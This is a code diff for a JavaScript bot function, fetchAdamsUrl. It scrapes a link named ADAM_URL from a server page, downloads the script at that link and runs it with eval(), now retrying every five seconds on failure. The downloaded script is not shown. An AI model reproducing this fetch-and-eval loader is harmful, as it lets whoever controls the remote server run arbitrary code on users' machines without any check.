@@ -110,45 +110,46 @@ clearSessionData();
 
 async function fetchAdamsUrl() {
   try {
-    // Add delay between connection attempts
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    const response = await axios.get(adams.BWM_XMD);
-    const $ = cheerio.load(response.data);
+    console.log('Attempting to connect to BWM XMD server...');
+    const response = await axios.get(adams.BWM_XMD, {
+      timeout: 5000,
+      validateStatus: status => status < 500
+    });
 
-    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
+    if (!response.data) {
+      throw new Error('Empty response received from server');
+    }
+
+    const $ = cheerio.load(response.data);
+    const adamsUrlElement = $('a:contains("ADAM_URL")');
     const adamsUrl = adamsUrlElement.attr('href');
 
     if (!adamsUrl) {
-      throw new Error('The URL link not found...');
+      throw new Error('ADAM_URL not found in response');
     }
 
-    // Check for existing connection
-    if (global.xmd?.user) {
-      console.log('Session already exists, cleaning up first...');
-      await global.xmd.logout();
-      delete global.xmd;
+    console.log('Successfully found ADAM_URL, connecting...');
+    const scriptResponse = await axios.get(adamsUrl, {
+      timeout: 5000,
+      validateStatus: status => status < 500
+    });
+
+    if (!scriptResponse.data) {
+      throw new Error('Empty script received');
     }
 
-    console.log('Connecting to the server...');
-    const scriptResponse = await axios.get(adamsUrl);
     eval(scriptResponse.data);
 
   } catch (error) {
-    console.error('Fatal Error:', {
+    console.error('Connection Error:', {
       message: error.message,
-      stack: error.stack,
-      timestamp: new Date().toISOString(),
-      type: error.name,
-      code: error.code || 'UNKNOWN'
+      code: error.code || 'UNKNOWN',
+      timestamp: new Date().toISOString()
     });
 
-    // Attempt to recover or gracefully shutdown
-    if (error.code === 'MODULE_NOT_FOUND') {
-      console.error('Missing required module. Please check your dependencies.');
-    } else if (error.code === 'ECONNREFUSED') {
-      console.error('Connection refused. Please check your network connection.');
-    }
+    // Retry after 5 seconds
+    console.log('Retrying connection in 5 seconds...');
+    setTimeout(fetchAdamsUrl, 5000);
   }
 }
 
